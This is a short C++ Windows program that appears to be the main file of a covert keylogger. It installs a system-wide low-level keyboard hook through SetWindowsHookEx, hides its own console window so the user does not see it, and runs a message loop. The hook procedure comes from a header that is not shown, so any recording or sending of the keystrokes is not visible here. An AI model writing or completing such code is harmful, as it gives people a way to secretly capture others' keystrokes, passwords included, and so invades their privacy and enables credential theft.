#include <iostream>
#include <Windows.h>
#include "hooks.h"

using namespace std;
int main()
{

	HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
	MSG msg;
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	while (!GetMessage(&msg, NULL, NULL, NULL)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(hhkLowLevelKybd);
    return 0;
}